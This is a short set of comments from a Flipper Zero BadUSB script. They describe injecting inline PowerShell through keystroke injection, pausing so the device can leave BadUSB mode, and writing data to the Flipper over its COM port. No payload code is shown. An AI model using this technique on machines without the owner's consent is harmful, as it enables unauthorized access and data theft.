REM Flipper will inject the inline powershell and run it.
REM The powershell starts with a delay. This is to give you time to hit BACK twice on the Flipper to get it out of BadUSB mode. Otherwise it wont save data
REM After the delay, the script will try to determine which COM port the Flipper is plugged into and will write a string to the specified file path.
